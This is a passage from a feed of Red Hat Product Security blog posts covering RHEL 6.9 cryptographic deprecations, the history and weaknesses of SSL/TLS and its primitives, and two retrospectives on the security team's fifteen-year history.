applications refuse to communicate with servers that advertise less than 1024-bit Diffie-Hellman parameters. The latter would ensure that LOGJAM-style of attacks are prevented. Furthermore, we will disable the usage of RC4 in contexts where this will not introduce compatibility issues.</p>\n<h2>All-around Application Support for TLS 1.2</h2>\n<p>While deprecating insecure algorithms and protocols protects applications running in RHEL from future attacks taking advantage of them, it is also important, given that RHEL 6.9 entered <a href=\"https://access.redhat.com/support/policy/updates/errata\">Production Phase 2</a>, to provide a solid cryptographic base for the remaining lifetime of the product. For that we will ensure that all the back-end cryptographic components support TLS 1.2, allowing new applications to be deployed and used during its lifetime.</p>\n<h2>Summary of Changes to Cryptographic Back-ends in RHEL 6.9</h2>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Introduced change</th>\n<th align=\"center\">Description</th>\n<th align=\"center\">Revertable</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\">TLS 1.2 protocol</td>\n<td align=\"center\">The protocol is made available to all shipped cryptographic libraries and enabled by default.</td>\n<td align=\"center\">N/A</td>\n</tr>\n<tr>\n<td align=\"center\">SSL 2.0 protocol</td>\n<td align=\"center\">The shipped TLS libraries will no longer include support for the SSL 2.0 protocol.</td>\n<td align=\"center\">No</td>\n</tr>\n<tr>\n<td align=\"center\">Export TLS ciphersuites</td>\n<td align=\"center\">The shipped TLS libraries will no longer include support for Export TLS ciphersuites.</td>\n<td align=\"center\">No</td>\n</tr>\n<tr>\n<td align=\"center\">TLS Diffie-Hellman key exchange</td>\n<td align=\"center\">Only parameters larger than 1024-bits will be accepted by default.<sup id=\"fnref:footnote\"><a href=\"#fn:footnote\" class=\"footnote-ref\">1</a></sup></td>\n<td align=\"center\">Yes. Administrators can revert this setting system-wide (information will provided in the release notes).</td>\n</tr>\n<tr>\n<td align=\"center\">MD5 algorithm for digital signatures</td>\n<td align=\"center\">The algorithm will not be enabled by default for TLS sessions or certificate verification on any of the TLS libraries we ship.</td>\n<td align=\"center\">Yes. Administrators can revert this setting system-wide (information will provided in the release notes).</td>\n</tr>\n<tr>\n<td align=\"center\">RC4 algorithm</td>\n<td align=\"center\">The algorithm will no longer be enabled by default for OpenSSH sessions.</td>\n<td align=\"center\">Yes. Administrators can revert this setting system-wide (information will provided in the release notes).</td>\n</tr>\n</tbody>\n</table>\n<div class=\"footnotes\">\n<hr />\n<ol>\n<li id=\"fn:footnote\">\n<p>This, exceptionally, applies only to OpenSSL, GnuTLS, and NSS cryptographic back-ends, not to Java/OpenJDK. <a href=\"#fnref:footnote\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n</ol>\n</div></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-2787271\"></div><div class=\"field field-name-field-product field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tProduct\t</h2>\n\n    Red Hat Enterprise Linux</div>","pubDate":"Tue, 03 Jan 2017 14:30:00 +0000","dc:creator":"Nikos Mavrogiannopoulos","guid":{"@isPermaLink":"false","#text":"2787271 at https://access.redhat.com"}},{"title":"Evolution of the SSL and TLS protocols","link":"https://access.redhat.com/blogs/766093/posts/2758801","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>The <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FTransport_Layer_Security\">Transport Layer Security (TLS) protocol</a> is undoubtedly the most widely used protocol on the Internet today. If you have ever done an online banking transaction, visited a social networking website, or checked your email, you have most likely used TLS. Apart from wrapping the plain text <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FHypertext_Transfer_Protocol\">HTTP protocol</a> with cryptographic goodness, other lower level protocols like <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FSimple_Mail_Transfer_Protocol\">SMTP</a> and <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FFile_Transfer_Protocol\">FTP</a> can also use TLS to ensure that all the data between client and server is inaccessible to attackers in between. This article takes a brief look at the evolution of the protocol and discusses why it was necessary to make changes to it.</p>\n<p>Like any other standard used today on the internet, the TLS protocol also has a humble beginning and a rocking history. Originally developed by <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FNetscape\">Netscape</a> in 1993 it was initially called Secure Sockets Layer (SSL). The first version was said to be so insecure that <a href=\"https://access.redhat.com/bounce/?externalURL=http%3A%2F%2Fwww.metzdowd.com%2Fpipermail%2Fcryptography%2F2013-October%2F018041.html\">\"it could be broken in ten minutes\"</a> when Marc Andreessen presented it at an MIT meeting. Several iterations were made which led to SSL version 2 and, later in 1995, SSL version 3. In 1996, an <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fwww.ietf.org%2F\">IETF</a> working group formed to standardize SSL. Even though the resulting protocol is almost identical to SSL version 3, the process took three years.</p>\n<p>TLS version 1.0, with a change in name to prevent trademark issues, was published as <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fwww.ietf.org%2Frfc%2Frfc2246.txt\">RFC 2246</a>. Later versions 1.1 and 1.2 were published which aimed to address several shortcomings and flaws in the earlier versions of the protocol.</p>\n<h2>Cryptographic primitives are based on mathematical functions and theories</h2>\n<p>The TLS protocol itself is based on several cryptographic primitives including asymmetric key exchange protocols, ciphers, and hashing algorithms. Assembling all these primitives together securely is non-trivial and would not be practical to implement individually in the same way TLS does. For example, AES is a pretty strong symmetric cipher, but like any other symmetric cipher it needs the encryption key to be securely exchanged between the client and the server. Without an asymmetric cipher there is no way to exchange keys on an insecure network such as the Internet. Hashing functions are used to help authenticate the certificates used to exchange the keys and also ensure integrity of data-in-transit. These hash algorithms, like <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FSecure_Hash_Algorithm\">SHA</a>, have one way properties and are reasonably collision resistant. All these cryptographic primitives, arranged in a certain way, make up the TLS protocol as a whole.</p>\n<h3>Key Exchanges</h3>\n<p>The reason two systems that have never met can communicate securely is due to secure key exchange protocols. Because each system must know the same secret to establish a secure communications path using a symmetric cipher, the use of key exchange systems allow those two systems to establish that secret and securely share it with each other to establish the communications path.</p>\n<p>The <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FRSA_%2528cryptosystem%2529\">Rivest-Shamir-Adleman (RSA) cryptosystem</a> is the most widely used asymmetric key exchange algorithm.  This algorithm assumes that factorization of large numbers is difficult, so while the public key (<em>n</em>) is calculated using <em>n = p x q</em>, it is hard for an attacker to factorize <em>n</em> into the corresponding primes <em>p</em> and <em>q</em>, which can be easily used to calculate the private key.</p>\n<p>The <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FDiffie%25E2%2580%2593Hellman_key_exchange\">Diffie-Hellman key exchange (DHE)</a> uses the discrete log problem and assumes that when given <em>y = g ^ a mod p</em>, it is difficult to solve this equation to extract the private key <em>a</em>.  Elliptic-Curve-based Diffie-Hellman key exchange (ECDHE) uses the abstract DH problem, but uses multiplication in elliptic curve groups for its security.</p>\n<h3>Symmetric algorithms</h3>\n<p>Symmetric algorithms used today like <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FAdvanced_Encryption_Standard\">Advanced Encryption Standard (AES)</a> have good <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FConfusion_and_diffusion\">confusion and diffusion properties</a>, which mean that the encrypted data will be statistically different from the input. <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fcr.yp.to%2Fchacha.html\">ChaCha20</a> is a newer stream cipher that is starting to see some traction and may see additional use in the future as a faster alternative to AES.</p>\n<h2>Changes as time and technology progresses</h2>\n<p>Faster computers are now more accessible to the common public via cloud computing, <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FGraphics_processing_unit\">GPUs</a>, and dedicated <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FField-programmable_gate_array\">FPGA</a> devices than they were 10 years ago. New computation methods have also become possible. <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FQuantum_computing\">Quantum computers</a> are getting bigger, making possible attacks on the underlying mathematics of many algorithms used for cryptography. Also, new research in mathematics means that as older theories are challenged and newer methods are invented and researched, our previous assumptions about hard mathematical problems are losing ground.</p>\n<p>New design flaws in the TLS protocol are also discovered from time to time. The <a href=\"https://access.redhat.com/blogs/766093/posts/1976403\">POODLE</a> flaw in SSL version 3 and <a href=\"https://access.redhat.com/blogs/product-security/posts/drown\">DROWN</a> flaw in SSL version 2 showed that the previous versions of the protocol are not secure.  We can likely expect currently deployed versions of TLS to also have weaknesses as research continues and computing power gets greater.</p>\n<h2>Attacks against cryptographic primitives and its future</h2>\n<h3>RSA</h3>\n<p>The best known attack against RSA is still factoring <em>n</em> into its components <em>p</em> and <em>q</em>. The best known algorithm for factoring integers larger than 10^100 is <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FGeneral_number_field_sieve\">the number field sieve</a>.  The current recommendation from NIST is <a href=\"https://access.redhat.com/bounce/?externalURL=http%3A%2F%2Fnvlpubs.nist.gov%2Fnistpubs%2FSpecialPublications%2FNIST.SP.800-57Pt3r1.pdf\">using a minimum RSA key length of 2048 bits</a> for information needed to be protected until at least the year 2030. For secrecy beyond that year larger keys will be necessary.</p>\n<p>RSA's future, however, is bleak! IETF recommended <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Ftools.ietf.org%2Fhtml%2Fdraft-ietf-tls-tls13-07\">removal of static-RSA from the TLS version 1.3 draft</a> standard stating \"[t]hese cipher suites have several drawbacks including lack of <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FPerfect_forward_secrecy\">PFS</a>, pre-master secret contributed only by the client, and the general weakening of RSA over time.  It would make the security analysis simpler to remove this option from TLS version 1.3.  RSA certificates would still be allowed, but the key establishment would be via DHE or ECDHE.\"  The consensus in the room at IETF-89 was to <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fwww.ietf.org%2Fmail-archive%2Fweb%2Ftls%2Fcurrent%2Fmsg12266.html\">remove RSA key transport from TLS 1.3</a>.</p>\n<h3>DHE and ECC</h3>\n<p>Like RSA, the best known attack against DHE is the number field sieve. With the current computing power available, a 512-bit DH key takes 10 core-years to break. NIST recommends a key size of 224 bits and 2048-bit group size for any information which needs to be protected till 2030.</p>\n<p>As compared to DHE, <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FElliptic_curve_cryptography\">ECC</a> has still stood its ground and is being increasingly used in newer software and hardware implementations. Most of the known attacks against ECC work only on <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fwww.hyperelliptic.org%2Ftanja%2FSHARCS%2Ftalks06%2Fecc_rub.pdf\">special hardware or against buggy implementations</a>. NIST recommends use of at least 224-bit key size for ECC curves.</p>\n<p>However, the biggest threat to all of the above key exchange methods is quantum computing. Once viable quantum computing technology is available, all of the above public key cryptography systems will be broken. NIST recently conducted a <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fwww.nist.gov%2Fnews-events%2Fevents%2F2015%2F04%2Fworkshop-cybersecurity-post-quantum-world\">workshop on post-quantum cryptography</a> and <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FPost-quantum_cryptography\">several alternatives</a> to the above public cryptography schemes were discussed. It is going to be interesting to watch what these discussions lead to, and what new standards are formed.</p>\n<h3>Symmetric ciphers and hashes</h3>\n<p>All symmetric block ciphers are vulnerable to brute force attacks. The amount of time taken to brute force depends on the size of the key; the bigger the key, the more time and power it takes to brute force. The <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fsweet32.info%2F\">SWEET32</a> attack has already shown that small block sizes are bad and has finally laid <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FTriple_DES\">3DES</a> to rest. We already know that <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FRC4\">RC4</a> is insecure and there have been <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fblog.mozilla.org%2Fsecurity%2F2015%2F09%2F11%2Fdeprecating-the-rc4-cipher%2F\">several attempts to deprecate it</a>.</p>\n<p>The proposed TLS version 1.3 draft has provision for only two symmetric ciphers, namely AES and ChaCha20, and introduces <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FAuthenticated_encryption\">authenticated encryption (AEAD)</a>. The only MAC function allowed is <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fcr.yp.to%2Fmac.html\">Poly1305</a>.</p>\n<h2>And in conclusion...</h2>\n<p>No one knows for sure what will happen next but history has shown that older algorithms are at risk.  That's why it is so important to stay up to date on cryptography technology.  Developers should make sure their software supports the latest versions of TLS while deprecating older versions that are broken (or weakened).  System owners should regularly <a href=\"https://access.redhat.com/articles/1504313\">test their systems</a> to verify what ciphers and protocols are supported and stay educated on what is current and what the risks are to utilizing old cryptography.</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-2758801\"></div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div><div class=\"field field-name-field-kcs-tags-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tTags\t</h2>\n\n    security    tls</div>","pubDate":"Wed, 16 Nov 2016 14:30:00 +0000","dc:creator":"Huzaifa Sidhpurwala","guid":{"@isPermaLink":"false","#text":"2758801 at https://access.redhat.com"}},{"title":"From There to Here (But Not Back Again)","link":"https://access.redhat.com/blogs/766093/posts/2712261","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>Red Hat Product Security recently celebrated our 15th anniversary this summer and while I cannot claim to have been with Red Hat for that long (although I’m coming up on 8 years myself), I’ve watched the changes from the “0day” of the Red Hat Security Response Team to today.  In fact, our SRT was the basis for the security team that <a href=\"https://access.redhat.com/bounce/?externalURL=http%3A%2F%2Fweb.archive.org%2Fweb%2F20000815081640%2Fhttp%3A%2F%2Fwww.linux-mandrake.com%2Fen%2Ffupdates.php3\">Mandrakesoft</a> started back in the day.</p>\n<p>In 1999, I started working for Mandrakesoft, primarily as a packager/maintainer.  The offer came, I suspect, because of the amount of time I spent volunteering to maintain packages in the distribution.  I also was writing articles for TechRepublic at the time, so I also ended up being responsible for some areas of documentation, contributing to the manual we shipped with every boxed set we sold (remember when you bought these things off the shelf?).</p>\n<p>Way back then, when security flaws were few and far between (well, the discovery of these flaws, not the existence of them, as we’ve found much to our chagrin over the years), there was one individual at Mandrakesoft who would apply fixes and release them.  The advisory process was ad-hoc at best, and as we started to get more volume it was taking his time away from kernel hacking and so they turned to me to help.  Having no idea that this was a pivotal turning point and would set the tone and direction of the next 16 years of my life, I accepted.  The first security advisory I released for Linux-Mandrake was an update to <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fold.lwn.net%2F2000%2F0713%2Fa%2Flm-bitchx.php3\">BitchX in July of 2000</a>.  So in effect, while Red Hat Product Security celebrated 15 years of existence this summer, <em>I</em> celebrated my 16th anniversary of “product security” in open source.</p>\n<p>When I look back over those 16 years, things have changed tremendously.  When I started the security “team” at Mandrakesoft (which, for the majority of the 8 years I spent there, was a one-man operation!) I really had no idea what the future would hold.  It blows my mind how far we as an industry have come and how far I as an individual have come as well.  Today it amazes me how I handled all of the security updates for all of our supported products (multiple versions of Mandriva Linux, the Single Network Firewall, Multi-Network Firewall, the Corporate Server, and so on).  While there was infrastructure to build the distributions, there was none for building or testing security updates.  As a result, I had a multi-machine setup (pre-VM days!) with a number of chroots for building and others for testing.  I had to do all of the discovery, the patching, backporting, building, testing, and the release.  In fact, I wrote the tooling to push advisories, send mail announcements, build packages across multiple chroots, and more.  The entire security update “stack” was written by me and ran in my basement.</p>\n<p>During this whole time I looked to Red Hat for leadership and guidance.  As you might imagine, we had to play a little bit of catchup many times and when it came to patches and information, it was Red Hat that we looked at primarily (I’m not at all ashamed to state that quite often we would pull patches from a Red Hat update to tweak and apply to our own packages!).  In fact, I remember the first time I talked with Mark Cox back in 2004 when we, along with representatives of SUSE and Debian, <a href=\"https://access.redhat.com/bounce/?externalURL=http%3A%2F%2Flxer.com%2Fmodule%2Fnewswire%2Fview%2F9986%2Findex.html\">responded to the claims that Linux was less secure than Windows</a>.  While we had often worked well together through cross-vendor lists like vendor-sec and coordinated on embargoed issues and so on, this was the first real public stand by open source security teams against some mud that was being hurled against not just our products, but open source security as a whole.  This was one of those defining moments that made me scary-proud to be involved in the open source ecosystem.  We set aside competition to stand united against something that deeply impacted us all.</p>\n<p>In 2009 I left Mandriva to work for Red Hat as part of the Security Response Team (what we were called back then).  Moving from a struggling small company to a much larger company was a very interesting change for me.  Probably the biggest change and surprise was that Red Hat had the developers do the actual patching and building of packages they normally maintained and were experienced with.  We had a dedicated QA team to test this stuff!  We had a rigorous errata process that automated as much as possible and enforced certain expectations and conditions of both errata and associated packages.  I was actually able to focus on the security side of things and not the “release chain” and all parts associated with it, plus there was a team of people to work with when investigating security issues.</p>\n<p>Back at Mandriva, the only standard we focused on was the usage of CVE.  Coming to Red Hat introduced me to the many standards that we not only used and promoted, but also helped shape.  You can see this in CVE, and now DWF, OpenSCAP and OVAL, CVRF, the list goes on.  Not only are we working to make, and keep, our products secure for our customers, but we apply our expertise to projects and standards that benefit others as these standards help to shape other product security or incident response teams, whether they work on open source or not.</p>\n<table cellpadding=\"5\" cellspacing=\"5\" width=\"100%\" border=\"0\">\n<tr>\n<td> <img src=\"/sites/default/files/styles/medium/public/tux-tattoo.png?itok=_YZ4EEPf\" width=\"179\" height=\"220\" alt=\"\" class=\"image-medium\" />\n</td>\n<td>\nFinally (as an aside and a “fun fact”) when I first started working at Mandrakesoft with open source and Linux, I got a tattoo of Tux on my calf.  A decade later, I got a tattoo of Shadowman on the other calf.  I’m really lucky to work on things with cool logos, however I’ve so far resisted getting a tattoo of the heartbleed logo!\n</td>\n<td> <img src=\"/sites/default/files/styles/medium/public/shadowman-tattoo.png?itok=KsxILBzm\" width=\"220\" height=\"185\" alt=\"\" class=\"image-medium\" />\n</td>\n</tr>\n</table>\n<p>I sit and think about that initial question that I was asked 16 years ago: “Would you want to handle the security updates?”.  I had no idea it would send me to work with the people, places, and companies that I have.  No question that there were challenges and more than a few times I’m sure that the internet was literally <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fistheinternetonfire.com%2F\">on fire</a> but it has been rewarding and satisfying.  And I consider myself fortunate that I get to work every day with some of the smartest, most creative, and passionate people in open source!</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-2712261\"></div>","pubDate":"Mon, 24 Oct 2016 13:30:00 +0000","dc:creator":"Vincent Danen","guid":{"@isPermaLink":"false","#text":"2712261 at https://access.redhat.com"}},{"title":"Happy 15th Birthday Red Hat Product Security","link":"https://access.redhat.com/blogs/766093/posts/2695561","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>This summer marked 15 years since we founded a dedicated Product Security team for Red Hat.  While we often publish information in this blog about security technologies and vulnerabilities, we rarely give an introspection into the team itself.  So I’d like, if I may, to take you on a little journey through those 15 years and call out some events that mean the most to me; particularly what’s changed and what’s stayed the same.  In the coming weeks some other past and present members of the team will be giving their anecdotes and opinions too.  If you have a memory of working with our team we’d love to hear about it, you can add a comment here or <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Ftwitter.com%2Fiamamoose\">tweet me</a>.</p>\n<p>Our story starts, however, before I joined the company.  Red Hat was producing Red Hat Linux in the 1990’s and shipping security updates to it. Here’s an <a href=\"https://www.redhat.com/archives/redhat-watch-list/1998-August/msg00003.html\">early security update notice</a> from 1998, and the first formal Red Hat Security Advisory (RHSA) <a href=\"https://www.redhat.com/archives/redhat-watch-list/1999-June/msg00005.html\">RHSA-1999:013</a>.  Red Hat would collaborate on security issues along with other Linux distributors on a private communication list called “vendor-sec”, then an engineer would build and test updates prior to them being signed and made available.</p>\n<p><img src=\"/sites/default/files/styles/large/public/rhsa1999013.png?itok=hRHsi154\" width=\"480\" height=\"223\" alt=\"\" class=\"image-large\" /></p>\n<p>In Summer 2000, Red Hat acquired <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fawe.com%2Fmark%2Fhistory%2Fc2net.html\">C2Net</a>, a security product company I was working at.  C2Net was known for the most widely used secure web server at the time, Stronghold.  Red Hat was a small company and so with my security background (being also a founder of the Apache Software Foundation and OpenSSL) it was common for all questions on anything security related to end up at my desk.  Although our engineers were responsive to dealing with security patches in Red Hat Linux, we didn’t have any published processes in handling issues or dealing with researchers and reporters, and we knew it needed something more scalable for the future and when we had more than one product.  So with that in mind I formed the Red Hat Security Response Team (SRT) in September 2001.</p>\n<p>The mission for the team was a simple one: to be “responsible for ensuring that security issues found in Red Hat products and services are addressed”.  The charter went into a little more detail:</p>\n<ul>\n<li>Be a contact point for our customers who have found security issues in our products or services, and publish our procedures for dealing with this contact;</li>\n<li>Track alerts and security issues within the community which may affect users of Red Hat products and services;</li>\n<li>Investigate and address security issues in our supported products and services;</li>\n<li>Ensure timely security fixes for our products;</li>\n<li>Ensure that customers can easily find, obtain, and understand security advisories and updates;</li>\n<li>Help customers keep their systems up to date, and minimize the risk of security issues;</li>\n<li>Work with other vendors of Linux and open source software (including our competitors) to reduce the risk of security issues through information sharing and peer review.</li>\n</ul>\n<p>That mission and the detailed charter were published on our web site along with many of our policies and procedures.  Over the years this has changed very little, and <a href=\"https://access.redhat.com/security/overview\">our mission today</a> maps closely to that original one.   From day one we wanted to be responsive to anyone who mailed the security team so we set a high internal SLA goal to have a human response to incoming security email within one business day.  We miss that high standard from time to time, but we average over 95% achievement.</p>\n<p>Fundamentally, all software has bugs; some bugs have a security consequence. If you’re a product vendor you need a security response team to handle tracking and fixing those security flaws.  Given Red Hat products are comprised of open source software, this presents some unique challenges in how to deal with security issues in a supply chain comprising of thousands of different projects, each with their own development teams, policies, and methodologies.  From those early days Red Hat worked out how to do this and do it well.   We leveraged the “Getting Things Done” (GTD) methodology to create internal workflows and processes that worked in a stressful environment:  where every day could bring something new, and work was mostly comprised of interruptions, you need to have a system you can trust so tasks can be postponed and reprioritised without getting lost.</p>\n<blockquote><p>\"Red Hat has had the best track record in dealing with third-party vulnerabilities. This may be due to the extent of their involvement with third-party vendors and the open-source community, as they often contribute their own patches and work closely with third-party vendors.\" -- Symantec Internet Security Threat Report 2007</p>\n</blockquote>\n<p>By 2002 we had started using Common Vulnerabilities and Exposures (CVE) names to identify vulnerabilities, not just during the publication of our advisories, but for helping with the co-ordination of issues in advance between vendors, an unexpected use that was a pleasant surprise to the creators at MITRE.  As a CVE editorial board member I would be personally asked to vote on every vulnerability (vulnerabilities would start out as candidates, with a CAN- prefix, before migrating to full CVE- names).  As you can imagine that process didn’t last long as the popularity of using CVE names across the industry meant the number of vulnerabilities being handled started to rapidly increase.  Now it is uncommon to hear about any vulnerability that doesn’t have a CVE name associated with it.  Scaling the CVE process became a big issue in the last few years and hit a crisis point; however in 2016 the DWF project forced changes which should help address these concerns long term, forcing a distributed process instead of one with a bottleneck.</p>\n<p>In the early 2000’s, worms that attacked Linux were fairly common, affecting services that were usually enabled and Internet facing by default such as “sendmail” and “samba”.  None of the worms were “0 day” however, they instead exploited vulnerabilities which had had updates to address them released weeks or months prior.  September 2002 saw the “Slapper worm” which affected OpenSSL via the Apache web server, “Millen” followed in November 2002 exploiting IMAP.  By 2005, Red Hat Enterprise Linux shipped with randomization, NX, and various heap and other protection mechanisms which, together with more secure application defaults (and SELinux enabled by default), helped to disrupt worms.  By 2014 logos and branded flaws took over our attentions, and exploits became aimed at making money through botnets and ransomware, or designed for leaking secrets.</p>\n<p>As worms and exploits with clever names were common then, vulnerabilities with clever names, domain names, logos, and other branding are common now.  This trend really started in 2014 with the OpenSSL flaw “<a href=\"https://access.redhat.com/security/vulnerabilities/heartbleed\">Heartbleed</a>”.  Heartbleed was a serious issue that helped highlight the lack of attention in some key infrastructure projects.  But not all the named security issues that followed were important. As we’ve <a href=\"https://access.redhat.com/blogs/product-security/posts/1976583\">shown in the past</a> just because a vulnerability gets a fancy name doesn’t mean it’s a significant issue (also true in reverse).  These issues highlighted the real importance of having a dedicated product security team – a group to weed through the hype and figure out the real impact to the products you supply to your customers.  It really has to be a trusted partnership with the customer though, as you have to prove that you’re actually doing work analysing vulnerabilities with security experts, and not simply relying on a press story or third-party vulnerability score.  Our <a href=\"https://access.redhat.com/blogs/766093/posts/2262281\">Risk Report for 2015</a> took a look at the branded issues and which ones mattered (and why) and at the Red Hat Summit for the last two years we’ve played a <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Ftwitter.com%2Fiamamoose%2Fstatus%2F607232871993122816\">“Game of Flaws”</a> card game, matching logos to vulnerabilities and talking about how to assess risk and figure out the importance of issues.</p>\n<p><img src=\"/sites/default/files/styles/medium/public/20150623-booth.jpg?itok=Rbu4dOdu\" width=\"220\" height=\"208\" alt=\"\" class=\"image-medium\" /></p>\n<p>Just like Red Hat itself, SRT was known for it’s openness and transparency.  By 2005 we were <a href=\"https://www.redhat.com/security/data/metrics/\">publishing security data</a> on every vulnerability we addressed along with the metrics on when the issue was public, how long it was embargoed, the issue CWE type, CVSS scoring, and more.  We provided XML feeds of vulnerabilities, scripts that could run risk reports, along with detailed blogs on our performance and metrics.  In 2006 we started publishing Open Vulnerability Assessment Language (OVAL) definitions for Red Hat Enterprise Linux products, allowing industry standard tools to be able to test systems for outstanding errata.  These OVAL definitions are consumed today by tools such as OpenSCAP. Our <a href=\"https://access.redhat.com/security/updates/backporting\">policy of backporting</a> security fixes caused problems for third-party scanning tools in the early days, but now by using our data such as our OVAL definitions they can still give accurate results to our mutual customers.  As new security standards emerged, like Common Vulnerability Reporting Framework (CVRF) in 2011, we’d get involved in the definitions and <a href=\"https://access.redhat.com/articles/124913\">embrace them</a>. In this case helping define the fields and providing initial example content to help promote the standard.  While originally we provided this data in downloadable files on our site, we now have an open API allowing easier access to all our vulnerability data.</p>\n<blockquote><p>\"Red Hat's transparency on its security performance is something that all distributions should strive for -- especially those who would tout their security response\" -- Linux Weekly News (July 2008)</p>\n</blockquote>\n<p>Back in 2005 this transparency on metrics was especially important; as our competitors (of non-open source operating systems) were publishing industry reports comparing vulnerability “days of risk” and doing demonstrations with bags of candies showing how many more vulnerabilities we were fixing than they were.  Looking back it’s hard to believe anyone took them seriously.  Our open data helped counter these reports and establish that they were not comparing things in a “like-for-like” way; for example treating all issues as having the same severity, or completely not counting issues that were found by the vendor themselves.  We even did a joint statement with other Linux distributions, something unprecedented. We still publish frequent “risk reports” which give an honest assessment of how well we handled security issues in our products, as well as helping customers figure out which issues mattered.</p>\n<p>Our team grew substantially over the years, both in numbers of associates and in diversity - with staff spread across time zones, offices, and in ten different countries.  Our work also was not just the reactive security work but involved proactive work such as auditing and bug finding too.  Red Hat associates in our team also help in upstream communities to help projects assess and deal with security issues and present at technical conferences.  We’d also help secure the internal supply chain, such as providing facilities and processes for package signing using hardware cryptographic modules.  This led a few years ago to the rebranding as “Red Hat Product Security” to better reflect this multi-faceted  nature of the team. Red Hat associates continue to find flaws in Red Hat products as well as in products and services from other companies which we report responsibly.  In 2016 for example 12% of issues addressed in our products were discovered by Red Hat associates, and we continue to work with our peers on embargoed security issues.</p>\n<p>In our first year we released 152 advisories to address 147 vulnerabilities.  In the last year we released 642 advisories to address 1415 vulnerabilities across more than 100 different products, and 2016 saw us release our 5000th advisory.</p>\n<p>In a subscription-based business you need to continually show value to customers, and we talk about it in terms of providing the highest quality of security service. We are already well known for getting timely updates our for critical issues: for Red Hat Enterprise Linux in 2016, for example, 96% of Critical security issues had an update available the same or next calendar day after the issue was made public.  But our differentiator is not just providing timely security updates, it’s a much bigger involvement. Take the issue in bash in 2014 which was branded “Shellshock” as an example.  Our team's response was to ensure we provided timely fixes, but also to provide proactive notifications to customers, through our technical account managers and portal notifications, as well as knowledge base and solution articles to help customers quickly understand the issue and their exposure.  Our engineers created the final patch used by vendors to address the issue,  we provided testing tools, and our technical blog describing the flaw was the definitive source of information which was referenced as authoritative by news articles and even <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fwww.us-cert.gov%2Fncas%2Fcurrent-activity%2F2014%2F09%2F24%2FBourne-Again-Shell-Bash-Remote-Code-Execution-Vulnerability\">US-CERT</a>.</p>\n<p><img src=\"/sites/default/files/styles/medium/public/20140518_162537.jpg?itok=Q5gVgX-r\" width=\"220\" height=\"208\" alt=\"\" class=\"image-medium\" /></p>\n<p>My favourite quote comes from Alan Kay in 1971: “The best way to predict the future is to invent it”.  I’m reminded every day of the awesome team of world-class security experts we’ve built up at Red Hat and I enthusiastically look forward to helping them define and invent the future of open source product security.</p></div><div class=\"form-item 